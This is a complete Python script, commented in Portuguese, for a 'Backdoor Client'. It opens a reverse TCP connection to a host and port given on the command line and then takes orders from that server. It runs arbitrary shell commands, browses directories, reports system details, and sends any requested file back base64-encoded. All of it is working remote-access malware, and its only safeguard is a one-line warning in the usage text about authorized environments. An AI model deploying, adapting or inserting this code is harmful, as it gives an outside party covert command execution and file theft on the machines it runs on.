#!/usr/bin/env python3
"""
Backdoor Client - Cliente para conexão reversa
Este script estabelece uma conexão reversa com um servidor e executa comandos remotamente.
"""

import os
import socket
import sys
import subprocess
import base64
import shlex
import json
from pathlib import Path


class BackdoorClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.current_dir = os.getcwd()
        self.buffer_size = 4096
        
    def connect(self):
        """Estabelece conexão com o servidor"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.host, int(self.port)))
            self.send_response("########## Cliente Conectado ##########\n")
            self.send_response(f"Diretório atual: {self.current_dir}\n")
            return True
        except socket.gaierror:
            print(f"[ERRO] Não foi possível resolver o endereço {self.host}")
            return False
        except ConnectionRefusedError:
            print(f"[ERRO] Conexão recusada em {self.host}:{self.port}")
            return False
        except Exception as e:
            print(f"[ERRO] Falha ao conectar: {str(e)}")
            return False
    
    def send_response(self, data):
        """Envia dados ao servidor com tratamento de encoding"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8', errors='ignore')
            self.socket.send(data)
        except Exception as e:
            print(f"[ERRO] Falha ao enviar dados: {str(e)}")
    
    def receive_command(self):
        """Recebe comando do servidor com buffer dinâmico"""
        try:
            data = b""
            while True:
                chunk = self.socket.recv(self.buffer_size)
                if not chunk:
                    return None
                data += chunk
                if len(chunk) < self.buffer_size:
                    break
            
            if not data:
                return None
                
            # Tenta decodificar como UTF-8
            try:
                return data.decode('utf-8').strip()
            except UnicodeDecodeError:
                # Se falhar, retorna como base64
                return base64.b64decode(data).decode('utf-8', errors='ignore').strip()
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[ERRO] Falha ao receber comando: {str(e)}")
            return None
    
    def execute_command(self, command):
        """Executa comando do sistema operacional"""
        try:
            # Remove espaços extras
            command = command.strip()
            
            # Comando vazio
            if not command:
                return "Comando vazio\n"
            
            # Comando especial: sair
            if command.lower() in ['q', 'quit', 'exit']:
                return "quit"
            
            # Comando especial: mudar diretório
            if command.lower().startswith('cd '):
                return self.change_directory(command[3:].strip())
            
            # Comando especial: download
            if command.lower().startswith('download '):
                return self.download_file(command[9:].strip())
            
            # Comando especial: upload
            if command.lower().startswith('upload '):
                return self.upload_file(command[7:].strip())
            
            # Comando especial: pwd (diretório atual)
            if command.lower() == 'pwd':
                return f"{os.getcwd()}\n"
            
            # Comando especial: sysinfo (informações do sistema)
            if command.lower() == 'sysinfo':
                return self.get_system_info()
            
            # Executa comando do sistema
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                cwd=self.current_dir,
                timeout=30,
                errors='ignore'
            )
            
            output = result.stdout if result.stdout else result.stderr
            if output:
                return output
            else:
                return f"Comando executado com sucesso (código de saída: {result.returncode})\n"
                
        except subprocess.TimeoutExpired:
            return "[ERRO] Comando excedeu o tempo limite de 30 segundos\n"
        except Exception as e:
            return f"[ERRO] Falha ao executar comando: {str(e)}\n"
    
    def change_directory(self, path):
        """Muda o diretório atual"""
        try:
            if not path:
                return f"Uso: cd <diretório>\nDiretório atual: {os.getcwd()}\n"
            
            # Suporta caminhos relativos e absolutos
            if os.path.isabs(path):
                new_dir = path
            else:
                new_dir = os.path.join(self.current_dir, path)
            
            if os.path.isdir(new_dir):
                os.chdir(new_dir)
                self.current_dir = os.getcwd()
                return f"Diretório alterado para: {self.current_dir}\n"
            else:
                return f"[ERRO] Diretório não encontrado: {path}\n"
        except PermissionError:
            return f"[ERRO] Permissão negada para acessar: {path}\n"
        except Exception as e:
            return f"[ERRO] Falha ao mudar diretório: {str(e)}\n"
    
    def download_file(self, file_path):
        """Envia arquivo para o servidor"""
        try:
            if not file_path:
                return "[ERRO] Especifique o caminho do arquivo\n"
            
            # Resolve caminho relativo/absoluto
            if os.path.isabs(file_path):
                full_path = file_path
            else:
                full_path = os.path.join(self.current_dir, file_path)
            
            if not os.path.exists(full_path):
                return f"[ERRO] Arquivo não encontrado: {file_path}\n"
            
            if not os.path.isfile(full_path):
                return f"[ERRO] Não é um arquivo: {file_path}\n"
            
            # Lê e envia o arquivo
            with open(full_path, 'rb') as f:
                file_data = f.read()
            
            # Envia em formato base64 para evitar problemas de encoding
            encoded_data = base64.b64encode(file_data).decode('utf-8')
            response = f"FILE_START:{os.path.basename(full_path)}:{len(file_data)}\n{encoded_data}\nFILE_END"
            return response
            
        except PermissionError:
            return f"[ERRO] Permissão negada para ler: {file_path}\n"
        except Exception as e:
            return f"[ERRO] Falha ao ler arquivo: {str(e)}\n"
    
    def upload_file(self, data):
        """Recebe arquivo do servidor (requer parsing especial no servidor)"""
        # Este comando requer implementação no servidor para receber o arquivo
        # Por enquanto, retorna mensagem informativa
        return "[INFO] Comando upload requer implementação no servidor\n"
    
    def get_system_info(self):
        """Retorna informações do sistema"""
        try:
            import platform
            
            info = {
                'Sistema Operacional': platform.system(),
                'Versão': platform.release(),
                'Arquitetura': platform.machine(),
                'Processador': platform.processor(),
                'Usuário': os.getenv('USER', os.getenv('USERNAME', 'Desconhecido')),
                'Diretório Atual': os.getcwd(),
                'Python': platform.python_version()
            }
            
            result = "=== Informações do Sistema ===\n"
            for key, value in info.items():
                result += f"{key}: {value}\n"
            
            return result
        except Exception as e:
            return f"[ERRO] Falha ao obter informações do sistema: {str(e)}\n"
    
    def run(self):
        """Loop principal do cliente"""
        if not self.connect():
            return False
        
        print(f"[+] Conectado a {self.host}:{self.port}")
        
        try:
            while True:
                command = self.receive_command()
                
                if command is None:
                    print("[!] Conexão perdida")
                    break
                
                # Executa comando
                response = self.execute_command(command)
                
                # Verifica se deve sair
                if response == "quit":
                    self.send_response("Encerrando conexão...\n")
                    break
                
                # Envia resposta
                self.send_response(response)
                
        except KeyboardInterrupt:
            print("\n[!] Interrompido pelo usuário")
        except Exception as e:
            print(f"[ERRO] Erro no loop principal: {str(e)}")
        finally:
            self.cleanup()
        
        return True
    
    def cleanup(self):
        """Fecha conexão e limpa recursos"""
        try:
            if self.socket:
                self.socket.close()
        except:
            pass


def usage():
    """Exibe informações de uso"""
    print("""
═══════════════════════════════════════════════════════════
  Backdoor Client - Cliente de Conexão Reversa
═══════════════════════════════════════════════════════════

Uso:
    python3 backdoor.py <IP_SERVIDOR> <PORTA>

Argumentos:
    IP_SERVIDOR    Endereço IP do servidor backdoor
    PORTA          Porta do servidor backdoor

Exemplos:
    python3 backdoor.py 192.168.1.100 4444
    python3 backdoor.py 127.0.0.1 8080

Comandos Disponíveis:
    cd <diretório>          - Muda o diretório atual
    pwd                     - Mostra o diretório atual
    sysinfo                 - Exibe informações do sistema
    download <arquivo>      - Faz download de um arquivo
    <comando>               - Executa qualquer comando do sistema
    q, quit, exit           - Encerra a conexão

⚠️  AVISO: Use apenas em ambientes autorizados e controlados!
═══════════════════════════════════════════════════════════
    """)
    sys.exit(1)


def main():
    """Função principal"""
    if len(sys.argv) != 3:
        usage()
    
    host = sys.argv[1]
    port = sys.argv[2]
    
    # Valida porta
    try:
        port_num = int(port)
        if port_num < 1 or port_num > 65535:
            print("[ERRO] Porta deve estar entre 1 e 65535")
            sys.exit(1)
    except ValueError:
        print("[ERRO] Porta deve ser um número")
        sys.exit(1)
    
    # Cria e executa cliente
    client = BackdoorClient(host, port)
    client.run()


if __name__ == "__main__":
    main()